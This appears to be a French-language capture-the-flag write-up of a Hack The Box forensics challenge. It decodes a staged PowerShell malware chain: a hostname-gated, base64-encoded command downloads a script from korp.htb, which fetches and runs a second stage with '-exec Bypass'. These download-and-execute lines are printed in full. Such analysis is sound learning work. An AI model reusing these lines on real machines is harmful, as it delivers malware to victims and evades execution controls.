# Thorin’s Amulet


Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

En démarrant le challenge, on obtient un script powershell `artifact.ps1` : 
```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```
D'abord le script vérifie si il s'éxécute bien sur `WORKSTATION-DM-0043` puis si c'est bien le cas, il éxécute :
```powershell
"SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
``` 
qui donne : 
```powershell
 ( New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```
Une fois décodé depuis de la base64. 
Depuis `http://korp.htb/update` il va télécharger ceci : 
```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```
Ce script va lui aussi GET un fichier à `http://korp.htb/a541a` avec `5337d322906ff18afedc1edc191d325d` comme clé puis l’éxécuté en bypassant certaines restrictions powershell grâce à `-exec Bypass`.

On récupère donc ce fichier pour voir ce qu’il y a de beau à l’intérieur, peut-être du code malveillant, ou alors, un flag ? 

![image-1](https://github.com/user-attachments/assets/3d72173f-3dcb-4a57-9247-5746e5528a2d)

![image-2](https://github.com/user-attachments/assets/bd53afe3-731d-4c8f-ac03-4ec33485ca0c)

Bon du coup, on rend ça lisible et une petite surprise nous attends : 

![image-3](https://github.com/user-attachments/assets/792052b8-7580-48a2-b91c-112da43214da)


